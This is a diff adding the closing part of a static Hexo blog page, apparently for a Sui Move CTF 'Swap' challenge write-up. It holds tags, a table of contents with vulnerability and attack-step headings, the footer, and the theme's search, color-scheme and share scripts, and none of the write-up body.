+                      <a href="/tags/CTF/" title="CTF">
+                        #CTF
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/Web3/" title="Web3">
+                        #Web3
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2025/09/13/MeAndNarrflow/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Sui-Move-CTF-Swap-Challenge-Writeup"><span class="toc-text">Sui Move CTF - Swap Challenge Writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8C%91%E6%88%98%E6%A6%82%E8%BF%B0"><span class="toc-text">挑战概述</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%91%E6%88%98%E4%BF%A1%E6%81%AF"><span class="toc-text">挑战信息</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E1-%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6%E9%94%99%E8%AF%AF-Critical"><span class="toc-text">漏洞1: 权限控制错误 (Critical)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E2-%E6%B1%A0%E5%AD%90%E9%94%AE%E5%80%BC%E7%94%9F%E6%88%90%E4%B8%8D%E5%AE%89%E5%85%A8-High"><span class="toc-text">漏洞2: 池子键值生成不安全 (High)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E3-is-solved%E6%9D%A1%E4%BB%B6%E5%8F%AF%E8%A2%AB%E7%BB%95%E8%BF%87"><span class="toc-text">漏洞3: is_solved条件可被绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E7%AD%96%E7%95%A5"><span class="toc-text">攻击策略</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%AE%9E%E6%96%BD"><span class="toc-text">攻击实施</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A41-%E5%88%A9%E7%94%A8%E6%9D%83%E9%99%90%E6%BC%8F%E6%B4%9E"><span class="toc-text">步骤1: 利用权限漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A42-%E9%83%A8%E7%BD%B2%E6%94%BB%E5%87%BB%E5%90%88%E7%BA%A6"><span class="toc-text">步骤2: 部署攻击合约</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A43-%E5%88%9B%E5%BB%BA%E5%81%87%E6%B1%A0%E5%AD%90"><span class="toc-text">步骤3: 创建假池子</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A44-%E8%A7%A6%E5%8F%91Flag"><span class="toc-text">步骤4: 触发Flag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E7%BB%93%E6%9E%9C"><span class="toc-text">攻击结果</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%80%E6%9C%AF%E8%A6%81%E7%82%B9"><span class="toc-text">技术要点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-PTB%E8%AF%AD%E6%B3%95%E7%9A%84%E6%AD%A3%E7%A1%AE%E4%BD%BF%E7%94%A8"><span class="toc-text">1. PTB语法的正确使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%81%87%E4%BB%A3%E5%B8%81%E7%BB%93%E6%9E%84%E4%BD%93%E7%9A%84%E5%85%B3%E9%94%AE%E4%BD%9C%E7%94%A8"><span class="toc-text">2. 假代币结构体的关键作用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%A9%BA%E6%B1%A0%E5%AD%90%E7%9A%84%E5%B7%A7%E5%A6%99%E5%88%A9%E7%94%A8"><span class="toc-text">3. 空池子的巧妙利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4%E5%BB%BA%E8%AE%AE"><span class="toc-text">防护建议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC"><span class="toc-text">完整攻击脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9"><span class="toc-text">学习要点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Sui-Move%E7%B1%BB%E5%9E%8B%E7%B3%BB%E7%BB%9F%E7%9A%84%E7%90%86%E8%A7%A3"><span class="toc-text">1. Sui Move类型系统的理解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-PTB%E7%9A%84%E5%BC%BA%E5%A4%A7%E5%8A%9F%E8%83%BD"><span class="toc-text">2. PTB的强大功能</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%8A%A8%E6%80%81%E5%AD%97%E6%AE%B5%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="toc-text">3. 动态字段的工作原理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" target="_blank" rel="noopener" href="https://github.com/DudeGuuud">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+        <li>
+          
+              <a title="rss" href="/rss.xml">
+                <i class="iconfont icon-rss"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/DudeGuuud">Copyright © 2025 DudeGuuud</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索文章...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + SUI%20MOVE%20CTF%202025%20(Swap)%20Write%20Up + '&url=' + http%3A%2F%2Fexample.com%2F2025%2F08%2F05%2FMOVE%2520CTF%25202025%2520(5-6)%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2025/08/05/MOVE%20CTF%202025%20(5-6)/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
